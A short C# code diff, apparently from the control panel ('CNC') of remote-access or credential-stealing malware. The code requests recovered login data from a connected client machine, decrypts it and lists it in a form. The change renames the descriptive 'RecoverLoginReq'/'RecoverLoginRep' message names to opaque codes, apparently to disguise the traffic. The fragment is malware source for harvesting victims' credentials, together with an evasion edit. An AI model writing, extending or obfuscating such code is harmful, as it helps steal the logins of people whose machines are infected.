@@ -29,7 +29,7 @@ namespace CNC.Forms
         {
             listView.Items.Clear();
              logins = JsonConvert.DeserializeObject<LoginData[]>(
-                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("RecoverLoginReq", "RecoverLoginRep", 20000, 
+                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("0x23", "1x23", 20000, 
                 Cryptography.Encrypt(Guid.NewGuid().ToString()))));
 
             for (int i = 0; i < logins.Length; i++)
